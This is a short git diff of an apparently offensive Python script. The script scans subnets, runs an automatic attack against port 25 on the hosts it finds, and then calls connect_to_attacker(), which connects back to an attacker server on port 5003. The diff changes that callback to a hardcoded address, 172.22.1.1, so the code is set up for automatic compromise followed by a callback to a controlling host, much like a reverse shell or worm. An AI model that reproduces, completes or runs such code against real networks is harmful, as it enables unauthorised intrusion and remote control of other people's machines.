@@ -88,8 +88,7 @@ def attack(nmap_res: list, PORT: int):
 				print("Connection error.")
 			print("\n ")
 			
-def connect_to_attacker():
-	SERVER_HOST = sys.argv[1]
+def connect_to_attacker(SERVER_HOST):
 	SERVER_PORT = 5003
 	BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
 	# separator string for sending 2 messages in one go
@@ -145,7 +144,7 @@ def main():
 		attack(target, int(port))
 	else:
 		attack(find_subnets(), 25)  # auto attack
-		connect_to_attacker()
+		connect_to_attacker("172.22.1.1")
 	
 
 if __name__ == "__main__":
